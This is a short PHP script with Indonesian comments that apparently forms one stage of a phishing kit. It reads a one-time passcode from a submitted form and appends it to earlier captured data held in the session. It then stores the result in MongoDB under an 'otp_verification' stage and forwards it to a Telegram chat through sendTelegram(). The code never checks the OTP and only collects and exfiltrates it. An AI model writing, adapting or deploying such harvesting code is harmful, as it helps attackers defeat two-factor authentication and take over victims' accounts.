<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/MongoDBSessionHandler.php';
require_once __DIR__ . '/telegram.php';

// Inisialisasi MongoDB Session Handler
$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
session_set_save_handler($mongoSessionHandler, true);
$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;

session_start();

$message = $_SESSION['message'] ?? '';
$code = $_POST['code'] ?? '';

$string = $message;
$string .= "OTP : `$code`\n";

$_SESSION['message'] = $string;
$_SESSION['otp'] = $code;

// Simpan juga ke MongoDB secara langsung
if (isset($mongoSessionHandler)) {
    $mongoSessionHandler->saveTelegramData($string, [
        'otp_code' => $code,
        'stage' => 'otp_verification'
    ]);
}

sendTelegram($string);
